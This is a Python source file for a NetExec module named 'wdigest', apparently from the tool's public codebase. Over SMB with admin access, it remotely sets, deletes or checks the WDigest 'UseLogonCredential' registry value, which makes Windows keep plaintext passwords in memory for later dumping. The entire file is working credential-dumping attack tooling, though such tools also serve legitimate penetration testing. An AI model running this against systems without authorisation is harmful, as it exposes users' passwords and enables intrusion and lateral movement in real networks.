from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5 import rrp
from impacket.examples.secretsdump import RemoteOperations
from nxc.helpers.misc import CATEGORY
import contextlib


class NXCModule:
    name = "wdigest"
    description = "Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1"
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING

    @staticmethod
    def register_module_options(subparsers):
        group = subparsers.add_mutually_exclusive_group(required=True)
        group.add_argument("--enable", help="Enable wdigest", action="store_true", dest="enable")
        group.add_argument("--disable", help="Disable wdigest", action="store_true", dest="disable")
        group.add_argument("--check", help="Check if wdigest is activated", action="store_true", dest="check")
        subparsers.set_defaults(module="wdigest")
        return subparsers

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.enable = getattr(module_options, "enable", False)
        self.disable = getattr(module_options, "disable", False)
        self.check = getattr(module_options, "check", False)

    def on_admin_login(self, connection):
        """Centralized RemoteOperations logic for enable/disable/check actions."""
        action = None
        if self.enable:
            action = "enable"
        elif self.disable:
            action = "disable"
        elif self.check:
            action = "check"

        if not action:
            self.context.log.fail("No action specified for wdigest module")
            return

        remote_ops = RemoteOperations(connection.conn, False)
        remote_ops.enableRegistry()

        try:
            # Open the WDigest registry key
            ans = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)
            reg_handle = ans["phKey"]
            ans = rrp.hBaseRegOpenKey(
                remote_ops._RemoteOperations__rrp,
                reg_handle,
                "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest"
            )
            key_handle = ans["phkResult"]

            if action == "enable":
                rrp.hBaseRegSetValue(remote_ops._RemoteOperations__rrp, key_handle, "UseLogonCredential\x00", rrp.REG_DWORD, 1)
                _, data = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "UseLogonCredential\x00")
                if int(data) == 1:
                    self.context.log.success("UseLogonCredential registry key created successfully")

            elif action == "disable":
                try:
                    rrp.hBaseRegDeleteValue(remote_ops._RemoteOperations__rrp, key_handle, "UseLogonCredential\x00")
                except Exception:
                    self.context.log.success("UseLogonCredential registry key not present")
                    return

                try:
                    rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "UseLogonCredential\x00")
                except DCERPCException:
                    self.context.log.success("UseLogonCredential registry key deleted successfully")

            elif action == "check":
                try:
                    _, data = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "UseLogonCredential\x00")
                    if int(data) == 1:
                        self.context.log.success("UseLogonCredential registry key is enabled")
                    else:
                        self.context.log.fail(f"Unexpected registry value for UseLogonCredential: {data}")
                except DCERPCException as d:
                    if "winreg.HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest" in str(d):
                        self.context.log.fail("UseLogonCredential registry key is disabled (registry key not found)")
                    else:
                        self.context.log.fail("UseLogonCredential registry key not present")

        finally:
            with contextlib.suppress(Exception):
                remote_ops.finish()
